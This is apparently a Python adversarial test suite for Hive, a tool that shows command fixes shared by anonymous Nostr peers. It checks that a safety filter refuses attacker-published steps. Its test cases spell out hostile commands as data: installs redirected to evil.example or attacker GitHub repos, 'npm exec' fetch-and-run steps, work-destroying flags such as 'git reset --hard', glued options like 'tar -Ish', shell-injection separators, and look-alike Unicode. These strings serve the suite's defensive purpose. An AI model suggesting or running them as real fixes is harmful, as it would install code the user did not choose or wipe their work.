"""Adversarial tests for what Hive accepts from anonymous Nostr peers.

Every case here is a fix text an attacker could publish with free random keys. The question each test asks is the
reviewer's: can a stranger make Hive show a command that fetches or runs code the user did not choose, points an
installer somewhere else, throws away the user's work, or hides what it really says? No Hermes and no public network
are needed: a local mock relay stands in for Nostr.

Run: python hive/tests/test_attacks.py           (add -v to print every case)
"""
import importlib
import itertools
import json
import os
import random
import shlex
import sys
import tempfile
import time
import traceback
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent.parent))
sys.path.insert(0, str(HERE))
PKG = HERE.parent.name
pkg = importlib.import_module(PKG)
engine = importlib.import_module(f"{PKG}.engine")
safety = importlib.import_module(f"{PKG}.safety")
sigmod = importlib.import_module(f"{PKG}.signature")
nostr = importlib.import_module(f"{PKG}.nostr")
mock_relay = importlib.import_module("mock_relay")
VERBOSE = "-v" in sys.argv

ok = safety.network_step_allowed

NODE = "Error: Cannot find module 'foo'"
NODE_SCOPED = "Error: Cannot find module '@acme/foo'"
PYE = "ModuleNotFoundError: No module named 'foo'"
GOE = "no required module provides package github.com/acme/foo; to add it: go get github.com/acme/foo"
GOE_SHORT = "go: cannot find module providing package foo"
BREW = 'Error: No available formula with the name "foo"'
CARGO = "error: no matching package named `foo` found"
GEM = "ERROR: Could not find a valid gem 'foo'"
APT = "E: Unable to locate package foo"
ANY = "x: error: failed"


def refused(cases):
    """Every (step, error, failed) must be refused. Returns the ones that were shown."""
    leaks = [c for c in cases if ok(*c)]
    if VERBOSE:
        for c in cases:
            print(f"      {'SHOWN ' if c in leaks else 'refused'}  {c[0]!r}  after {c[2]!r}")
    return leaks


def shown(cases):
    """Every case must still be shown (legitimate fixes): over-blocking is a failure too."""
    lost = [c for c in cases if not ok(*c)]
    if VERBOSE:
        for c in cases:
            print(f"      {'LOST  ' if c in lost else 'shown '}  {c[0]!r}  after {c[2]!r}")
    return lost


def check(leaks, what):
    assert not leaks, f"{len(leaks)} {what}:\n" + "\n".join(f"   {s!r}  (error {e!r}, failed {f!r})" for s, e, f in leaks)


# ── 1. the review's own examples, against every local failure that would help them most ──────────────────────

def test_reviewer_examples_whatever_failed():
    steps = ["npm exec evil-pkg", "pnpm dlx evil-pkg", "go run evil.example/m@latest", "cargo run",
             "pip download evil-sdist", "npm x evil-pkg", "yarn dlx evil-pkg", "bun x evil-pkg", "npm create evil",
             "npm init evil", "npm run-script evil", "npm start", "npm test", "pip wheel evil-sdist"]
    cases = []
    for s in steps:
        toks = s.split()
        failed = ["", toks[0], f"{toks[0]} install", f"{toks[0]} build", s] + \
                 [" ".join(toks[:k]) for k in range(1, len(toks))]
        cases += [(s, e, f) for f in failed for e in (NODE, PYE, GOE, ANY)]
    check(refused(cases), "fetch-and-run steps from the review were shown")


# ── 2. installs that look named by the error but fetch something else ───────────────────────────────────────

def test_install_alias_and_source_smuggling():
    """`foo` is named in the error, but each of these installs code from somewhere the user did not choose."""
    cases = [
        # npm / pnpm / yarn / bun: aliases, git hosts, paths, tarballs, protocols
        ("npm install foo@npm:evil-pkg", NODE, ""), ("npm i foo@npm:evil-pkg@1.0.0", NODE, ""),
        ("pnpm add foo@npm:evil-pkg", NODE, ""), ("yarn add foo@npm:evil-pkg", NODE, ""),
        ("npm install attacker/foo", NODE, ""), ("npm install attacker/foo#main", NODE, ""),
        ("npm install github:attacker/foo", NODE, ""), ("npm install gitlab:attacker/foo", NODE, ""),
        ("npm install bitbucket:attacker/foo", NODE, ""), ("npm install gist:abc123", NODE, ""),
        ("npm install git+ssh://git@evil.example/foo.git", NODE, ""), ("npm install foo@git+https://evil/x", NODE, ""),
        ("npm install file:../foo", NODE, ""), ("npm install link:../foo", NODE, ""),
        ("npm install foo@file:../evil", NODE, ""), ("npm install foo@link:/tmp/evil", NODE, ""),
        ("npm install workspace:foo", NODE, ""), ("pnpm add foo@workspace:*", NODE, ""),
        ("yarn add foo@portal:../evil", NODE, ""), ("yarn add foo@patch:foo@1#./evil.patch", NODE, ""),
        ("npm install ./foo", NODE, ""), ("npm install ../foo", NODE, ""), ("npm install /tmp/foo", NODE, ""),
        ("npm install ~/foo", NODE, ""), ("npm install foo.tgz", NODE, ""), ("npm install ./foo-1.0.0.tgz", NODE, ""),
        ("npm install @attacker/foo", NODE, ""), ("npm install foo --registry evil.example", NODE, ""),
        ("npm install foo --registry=foo", NODE, ""), ("npm install foo -w foo", NODE, ""),
        ("npm install foo --userconfig foo", NODE, ""), ("npm install foo --prefix foo", NODE, ""),
        # pip / pipx / uv / poetry
        ("pip install ./foo", PYE, ""), ("pip install ../foo", PYE, ""), ("pip install foo/", PYE, ""),
        ("pip install /tmp/foo", PYE, ""), ("pip install ~/foo", PYE, ""), ("pip install foo.whl", PYE, ""),
        ("pip install foo-1.0.tar.gz", PYE, ""), ("pip install foo.zip", PYE, ""),
        ("pip install foo@file:///tmp/evil", PYE, ""), ("pip install 'foo @ https://evil.example/foo.whl'", PYE, ""),
        ("pip install -e foo", PYE, ""), ("pip install --editable foo", PYE, ""), ("pip install -e .", PYE, ""),
        ("pip install -r foo", PYE, ""), ("pip install --requirement foo", PYE, ""), ("pip install -rfoo", PYE, ""),
        ("pip install -c foo foo", PYE, ""), ("pip install foo -i foo", PYE, ""), ("pip install foo -ifoo", PYE, ""),
        ("pip install foo --index-url foo", PYE, ""), ("pip install foo --extra-index-url foo", PYE, ""),
        ("pip install foo -f foo", PYE, ""), ("pip install foo --find-links foo", PYE, ""),
        ("pip install foo --trusted-host foo", PYE, ""), ("pip install foo --target foo", PYE, ""),
        ("pip install foo --root foo", PYE, ""), ("pip install foo --src foo", PYE, ""),
        ("pip install foo --config-settings foo", PYE, ""), ("pipx install foo --index-url foo", PYE, ""),
        ("uv add foo --index foo", PYE, ""), ("uv add foo --git foo", PYE, ""), ("uv add ./foo", PYE, ""),
        ("poetry add foo --source foo", PYE, ""), ("poetry add ./foo", PYE, ""), ("poetry add git+https://x/foo", PYE, ""),
        # go: the error names a full module path; a different module with the same last part is not it
        ("go install evil.example/foo@latest", GOE_SHORT, ""), ("go get evil.example/x/foo", GOE_SHORT, ""),
        ("go get github.com/attacker/foo", GOE, ""), ("go install github.com/acme/foo/cmd/evil@latest", GOE, ""),
        ("go get github.com/acme/foo@evilbranch", GOE, "") if False else ("go get evil.example/github.com/acme/foo", GOE, ""),
        # brew taps, cargo sources, gems, apt, choco, winget
        ("brew install attacker/tap/foo", BREW, ""), ("brew install --HEAD attacker/tap/foo", BREW, ""),
        ("brew install ./foo.rb", BREW, ""), ("brew install https://evil.example/foo.rb", BREW, ""),
        ("cargo add foo --path ../evil/foo", CARGO, ""), ("cargo add foo --git foo", CARGO, ""),
        ("cargo install foo --git https://evil.example/foo", CARGO, ""), ("cargo install --path foo", CARGO, ""),
        ("cargo add foo --registry foo", CARGO, ""), ("cargo install foo --index foo", CARGO, ""),
        ("gem install foo -s foo", GEM, ""), ("gem install foo --source foo", GEM, ""), ("gem install ./foo.gem", GEM, ""),
        ("apt-get install ./foo.deb", APT, ""), ("apt-get install foo -o foo", APT, ""), ("apt install /tmp/foo.deb", APT, ""),
        ("apt-get install foo -t foo", APT, ""), ("dnf install ./foo.rpm", APT, ""),
        ("choco install foo -s foo", ANY.replace("x", "foo"), ""), ("winget install foo --source foo", ANY.replace("x", "foo"), ""),
    ]
    check(refused(cases), "installs that fetch from a source the user did not choose were shown")


def test_installs_that_really_are_named_by_the_error_still_show():
    # `pip install 'foo>=1.2,<2'` is refused on purpose: `<` and `>` are refused anywhere in network text, quoted or not
    cases = [("pip install foo", PYE, ""), ("pip install foo==1.2.3", PYE, ""), ("pip install foo~=1.2", PYE, ""),
             ("pip install foo[all]", PYE, ""), ("pip install -U foo", PYE, ""), ("pip install --user foo", PYE, ""),
             ("python3 -m pip install foo", PYE, ""), ("pip3 install foo", PYE, ""),
             ("pip install pyyaml", "ModuleNotFoundError: No module named 'yaml'", ""),
             ("npm install foo", NODE, ""), ("npm install foo@1.2.3", NODE, ""), ("npm i -D foo", NODE, ""),
             ("npm install foo@latest", NODE, ""), ("npm install foo --save-dev", NODE, ""),
             ("npm install @acme/foo", NODE_SCOPED, ""), ("pnpm add foo", NODE, ""), ("yarn add foo", NODE, ""),
             ("go get github.com/acme/foo", GOE, ""), ("go get github.com/acme/foo@latest", GOE, ""),
             ("brew install foo", BREW, ""), ("cargo add foo", CARGO, ""), ("cargo install foo --locked", CARGO, ""),
             ("gem install foo", GEM, ""), ("apt-get install -y foo", APT, ""), ("sudo apt-get install foo", APT, "")]
    check(shown(cases), "legitimate installs named by the error were refused")


# ── 3. the user's own command plus flags: flags that smuggle a value, destroy work or skip a confirmation ────

def test_glued_short_options_that_name_a_program_or_file():
    cases = [("tar xf a.tar -Ish", "tar: error", "tar xf a.tar"), ("tar xf a.tar -Fsh", "tar: error", "tar xf a.tar"),
             ("man ls -Psh", "man: error", "man ls"), ("pip install -rx", PYE, "pip install"),
             ("less notes.txt -Psh", ANY, "less notes.txt"), ("zip a.zip f -TTsh", ANY, "zip a.zip f"),
             ("git log -Ox", ANY, "git log"), ("ssh host -osh", ANY, "ssh host"), ("rpm -q x -ix", ANY, "rpm -q x"),
             ("datactl sync -esh", ANY, "datactl sync"), ("datactl sync -cx", ANY, "datactl sync"),
             ("unknowntool go -Xsh", ANY, "unknowntool go")]
    check(refused(cases), "short options with a glued value were shown")


def test_flags_that_throw_away_work_or_skip_a_confirmation():
    cases = [("git checkout main -f", "error: Your local changes would be overwritten", "git checkout main"),
             ("git checkout main --force", ANY, "git checkout main"), ("git switch main --discard-changes", ANY, "git switch main"),
             ("git reset --hard", ANY, "git reset"), ("git clean -n -f -d -x", ANY, "git clean -n"),
             ("git branch -D", ANY, "git branch"), ("git push --force-with-lease", ANY, "git push"),
             ("git push --force", ANY, "git push"), ("git push --delete", ANY, "git push"), ("git push --mirror", ANY, "git push"),
             ("git fetch --prune", ANY, "git fetch"), ("git stash --include-untracked", ANY, "git stash") if False else
             ("git pull -X", ANY, "git pull"),
             ("terraform apply --auto-approve", "Error: x", "terraform apply"), ("tofu destroy --auto-approve", ANY, "tofu destroy"),
             ("pulumi up --yes", ANY, "pulumi up"), ("pulumi up --skip-preview", ANY, "pulumi up"),
             ("gcloud run deploy --quiet", ANY, "gcloud run deploy"), ("aws s3 sync --delete", ANY, "aws s3 sync"),
             ("az group delete --yes", ANY, "az group delete"), ("gh repo delete --yes", ANY, "gh repo delete"),
             ("vercel --prod --yes", ANY, "vercel --prod"), ("ansible-playbook site.yml --force-handlers", ANY, "ansible-playbook site.yml"),
             ("datactl sync --purge", ANY, "datactl sync"), ("datactl sync --wipe", ANY, "datactl sync"),
             ("datactl sync --overwrite", ANY, "datactl sync"), ("datactl sync --delete", ANY, "datactl sync"),
             ("datactl sync --hard", ANY, "datactl sync"), ("datactl sync --recursive", ANY, "datactl sync"),
             ("datactl sync --no-confirm", ANY, "datactl sync"), ("pacman -Syu --noconfirm", ANY, "pacman -Syu"),
             ("apt-get dist-upgrade --assume-yes", ANY, "apt-get dist-upgrade"), ("datactl sync --nuke", ANY, "datactl sync"),
             ("mkdir x --mode=777", ANY, "mkdir x"), ("datactl sync --umask=0", ANY, "datactl sync"),
             ("datactl sync --uid=0", ANY, "datactl sync"), ("datactl sync --chmod=777", ANY, "datactl sync")]
    check(refused(cases), "destructive or confirmation-skipping flags were shown")


def test_windows_and_versioned_program_names_get_the_same_rules():
    cases = [("npm.cmd install foo@npm:evil", NODE, ""), ("npm.cmd exec evil", NODE, "npm.cmd install"),
             ("yarn.cmd build --force", NODE, "yarn.cmd build"), ("NPM.CMD exec evil", NODE, "NPM.CMD install"),
             ("pnpm.exe dlx evil", NODE, "pnpm.exe install"), ("python.exe -c 1", PYE, "python.exe app.py"),
             ("python3.12 app.py --x", PYE, "python3.12 app.py"), ("node18 app.js --inspect", NODE, "node18 app.js"),
             ("bash.exe x.sh -x", ANY, "bash.exe x.sh"), ("pwsh.exe x.ps1 -NoProfile", ANY, "pwsh.exe x.ps1"),
             ("Git.exe checkout main -f", ANY, "Git.exe checkout main"), ("terraform.exe apply --auto-approve", ANY, "terraform.exe apply"),
             ("tar.exe xf a.tar -Ish", ANY, "tar.exe xf a.tar"), ("cargo.exe run", CARGO, "cargo.exe build")]
    check(refused(cases), "Windows or versioned program names bypassed a rule")


def test_text_that_hides_what_it_really_says():
    """Control characters, invisible characters and look-alikes: refused, or they can make the shown text differ
    from what a terminal would run, or redraw the hint."""
    own = "npm install"
    cases = [(f"npm install --force{c}", NODE, own) for c in
             ["\r", "\x00", "\x1b[2K", "\x1b]0;x\x07", "\x08", "\x7f", "\u202e", "\u2066", "\u200b", "\ufeff", "\u00a0"]]
    cases += [("npm\tinstall\t--force", NODE, own), ("npm install\r--force", NODE, own),
              ("npm install --for\u200bce", NODE, own), ("npm install \u2014force", NODE, own),
              ("npm install \u2013-force", NODE, own), ("npm install \uff0d\uff0dforce", NODE, own),
              ("npm \u0456nstall --force", NODE, own), ("npm install --f\u043erce", NODE, own),
              ("npm install --force\u00a0x", NODE, own), ("npm install --force\\", NODE, own),
              ("npm install --force #x", NODE, own), ("npm install --force $X", NODE, own),
              ("npm install --force $'\\x41'", NODE, own), ("npm install --force {a,b}", NODE, own),
              ("npm install --force *", NODE, own), ("npm install --force ~", NODE, own),
              ("npm install --force !!", NODE, own), ("npm install --force\\\nx", NODE, own),
              ("npm install 'unterminated", NODE, own), ("npm install \"--force", NODE, own)]
    check(refused(cases), "steps with hidden or look-alike text were shown")


def test_shell_syntax_in_every_position():
    own = "datactl sync"
    seps = [";", "&&", "||", "|", "&", "`x`", "$(x)", "${x}", ">", ">>", "<", "2>&1", "<(x)", ">(x)", "\nx", "|&"]
    cases = []
    for s in seps:
        cases += [(f"datactl sync --force {s} curl x", ANY, own), (f"datactl sync --force{s}x", ANY, own),
                  (f"{s} datactl sync --force", ANY, own), (f"datactl sync {s}--force", ANY, own)]
    check(refused(cases), "steps with shell syntax were shown")


def test_the_user_own_command_is_never_rewritten():
    own = "datactl sync --profile prod"
    cases = [("datactl sync --profile staging", ANY, own), ("datactl sync --profile", ANY, own),
             ("datactl sync prod --profile", ANY, own), ("datactl --profile prod sync", ANY, own),
             ("datactl sync --profile prod --profile staging", ANY, own), ("datactl sync --profile=prod", ANY, own),
             ("datactl sync --profile prod staging", ANY, own), ("datactl  sync --profile prod -- x", ANY, own),
             ("datactl sync --profile prod --", ANY, own), ("datactl sync --profile prod -", ANY, own),
             ("datactl sync --profile prod --x=evil", ANY, own), ("datactl sync --profile prod --x=1.2.3.4", ANY, own)]
    check(refused(cases), "a step that changes the user's own words was shown")


def test_legitimate_flag_fixes_still_show():
    cases = [("npm install --legacy-peer-deps", NODE, "npm install"), ("npm install --force", NODE, "npm install"),
             ("npm ci --jobs=1", NODE, "npm ci"), ("apt-get update --fix-missing", APT, "apt-get update"),
             ("apt-get install -f", APT, "apt-get install"), ("git pull --rebase", ANY, "git pull"),
             ("git fetch --unshallow", ANY, "git fetch"), ("cargo build --offline", CARGO, "cargo build") if False else
             ("cargo fetch --locked", CARGO, "cargo fetch"), ("go mod tidy -e", GOE, "go mod tidy"),
             ("datactl sync --rebuild-index", ANY, "datactl sync"), ("datactl sync -v", ANY, "datactl sync"),
             ("datactl sync --retries=3 -v", ANY, "datactl sync"), ("apt-get update --fix-missing", APT, "sudo apt-get update"),
             ("datactl sync --timeout=2.5", ANY, "datactl sync"), ("npm install --no-audit", NODE, "npm install")]
    check(shown(cases), "legitimate flag fixes were refused")


def test_a_stranger_never_adds_sudo_or_a_confirmation_skip():
    cases = [("sudo apt-get update --fix-missing", APT, "sudo apt-get update"), ("sudo datactl sync", ANY, "datactl sync"),
             ("datactl sync -y", ANY, "datactl sync"), ("datactl sync --yes", ANY, "datactl sync"),
             ("apt-get dist-upgrade -y", ANY, "apt-get dist-upgrade"), ("datactl sync --skip-confirmation", ANY, "datactl sync"),
             ("datactl sync --no-prompt", ANY, "datactl sync"), ("datactl sync --non-interactive", ANY, "datactl sync") if False
             else ("datactl sync --no-interactive", ANY, "datactl sync")]
    check(refused(cases), "a stranger's sudo or confirmation skip was shown")


# ── 4. end to end: signed events from many fake installs over a relay ────────────────────────────────────────

def _hive(**settings):
    d = Path(tempfile.mkdtemp(prefix="hive-attack-"))
    h = engine.Hive(d, home=f"/home/u{os.getpid()}")
    for k, v in settings.items():
        setattr(h.settings, k, v)
    h.settings.save(h.store)
    return h


def _publish(url, sig, prog, shape, steps, peers, content=None):
    for _ in range(peers):
        a = _hive(network="share", relays=[url], min_pow=8)
        row = {"sig": sig, "fix_id": sigmod.fix_id(steps), "program": prog, "error": shape,
               "fix": json.dumps(steps), "ok": 50, "fail": 0, "os": "linux"}
        ev = a.build_event(row)
        nostr.publish([url], ev)


def _show(h, sig):
    real = pkg._data_dir
    pkg._data_dir = lambda: h.data_dir
    pkg._HIVE = h
    try:
        return pkg._show(sig[:10])
    finally:
        pkg._data_dir = real
        pkg._HIVE = None


def test_sybil_swarm_with_every_smuggling_trick_shows_nothing():
    """30 fake installs per attack, all signed and with proof of work, for the error the victim really gets."""
    relay, url, stop = mock_relay.start_in_thread()
    try:
        failed, out = "node app.js", "Error: Cannot find module 'foo'\nRequire stack:\n- /home/v/app.js"
        sig, prog, shape = sigmod.signature(failed, out)
        attacks = [["npm install foo@npm:evil-pkg"], ["npm install attacker/foo"], ["npm install github:attacker/foo"],
                   ["npm exec foo"], ["npx foo"], ["npm install foo", "node -e 1"], ["npm install ./foo"],
                   ["node app.js --require=evil"], ["node app.js -r evil"]]
        for steps in attacks:
            _publish(url, sig, prog, shape, steps, peers=30 if steps == attacks[0] else 3)
        victim = _hive(network="read", relays=[url], min_pow=8, min_peers=2, lookup_timeout=4.0)
        note = victim.observe(failed, out, 1, "t")
        assert note is None, note
        shown_text = _show(victim, sig)
        for steps in attacks:
            for s in steps:
                assert s not in shown_text, (s, shown_text)
        assert "Refused" in shown_text, shown_text
    finally:
        stop.set()


def test_events_carrying_control_characters_are_not_stored():
    relay, url, stop = mock_relay.start_in_thread()
    try:
        failed, out = "npm install", "npm ERR! code ERESOLVE\nnpm ERR! ERESOLVE unable to resolve dependency tree"
        sig, prog, shape = sigmod.signature(failed, out)
        for bad in (["npm install --force\r"], ["npm install --force\x1b[8m"], ["npm install --force\u202e"]):
            _publish(url, sig, prog, shape, bad, peers=2)
        victim = _hive(network="read", relays=[url], min_pow=8, min_peers=1, lookup_timeout=4.0)
        victim.observe(failed, out, 1, "t")
        stored = [json.loads(v["fix"]) for v in victim.store.votes(sig)]
        assert not stored, stored
    finally:
        stop.set()


def test_a_smuggled_install_learned_locally_is_never_published():
    h = _hive(network="share")
    out = "Error: Cannot find module 'foo'"
    for i, fix in enumerate(["npm install foo@npm:evil-pkg", "npm install attacker/foo", "pip install ../foo"]):
        h.observe("node app.js", out, 1, f"t{i}")
        h.observe(fix, "added 1 package", 0, f"t{i}")
        h.observe("node app.js", "ok", 0, f"t{i}")
    rows = h.store.all_antibodies()
    assert rows and not any(r["shareable"] for r in rows), [(r["fix"], r["shareable"]) for r in rows]
    assert not h.store.pending()


def test_a_fix_with_one_bad_step_is_refused_whole():
    own = "npm install"
    for bad in ("npm exec evil", "npm install foo@npm:evil", "git reset --hard", "tar xf a -Ish"):
        assert not all(ok(s, NODE, own) for s in ["npm install --legacy-peer-deps", bad]), bad


# ── 5. random mutation: start from accepted fixes, mutate like an attacker, compare with an independent oracle ─

_ORACLE_PLAIN = __import__("re").compile(r"--[a-z][a-z0-9]*(-[a-z0-9]+)*(=[0-9]+(\.[0-9]+)*)?|-[a-zA-Z0-9]")


def _oracle_accepts_as_own_plus_flags(step, own):
    """Independent, deliberately strict statement of shape 2: own tokens, then lowercase plain flags only."""
    try:
        s, o = shlex.split(step), shlex.split(own)
    except ValueError:
        return False
    if any(ord(ch) < 32 or ord(ch) == 127 or ord(ch) > 126 for ch in step):
        return False
    return s[:len(o)] == o and all(_ORACLE_PLAIN.fullmatch(t) for t in s[len(o):])


def test_random_mutations_never_pass_outside_the_oracle():
    rnd = random.Random(20261113)
    owns = ["npm install", "datactl sync", "git pull", "apt-get update", "go mod tidy", "pnpm install", "cargo fetch",
            "datactl sync --profile prod", "unknowntool check"]
    extra = ["exec", "run", "x", "dlx", "evil-pkg", "foo@npm:evil", "attacker/foo", "./foo", "-Ish", "-rx",
             "--force", "-f", "--hard", "--auto-approve", "--yes", "-y", "--registry=evil", "--jobs=1", "--x=a",
             "--", "-", ";", "&&", "|", "$(x)", "`x`", "\r", "\u202e", "\u200b", "#", "~", "*", "--purge", "-Xsh",
             "--legacy-peer-deps", "--rebuild-index", "--offline", "--unsafe-perm", "--no-verify", "-D", "-d"]
    leaks, n = [], 0
    for _ in range(60000):
        own = rnd.choice(owns)
        toks = own.split()
        op = rnd.random()
        if op < 0.5:
            toks = toks + rnd.sample(extra, rnd.choice([1, 1, 2, 3]))
        elif op < 0.7:
            toks.insert(rnd.randrange(1, len(toks) + 1), rnd.choice(extra))
        elif op < 0.85:
            toks[rnd.randrange(len(toks))] = rnd.choice(extra)
        else:
            toks = [rnd.choice(["npx", "npm", "node", "bash", "sh", "python3", "curl"])] + toks[1:] + [rnd.choice(extra)]
        step = " ".join(toks) if rnd.random() < 0.8 else "".join(rnd.choice([" ", "\t"]) + t for t in toks).strip()
        n += 1
        if ok(step, NODE, own) and not safety.install_targets(step) and not _oracle_accepts_as_own_plus_flags(step, own):
            leaks.append((step, NODE, own))
    assert not leaks, f"{len(leaks)} of {n} mutations passed outside the oracle, e.g. {leaks[:5]}"


def main():
    tests = [(n, f) for n, f in globals().items() if n.startswith("test_") and callable(f)]
    failed = 0
    for name, fn in tests:
        t0 = time.time()
        try:
            fn()
            print(f"ok    {name}  ({time.time() - t0:.2f}s)")
        except Exception:  # noqa: BLE001
            failed += 1
            print(f"FAIL  {name}")
            traceback.print_exc(limit=1)
    print(f"\n{len(tests) - failed} of {len(tests)} passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
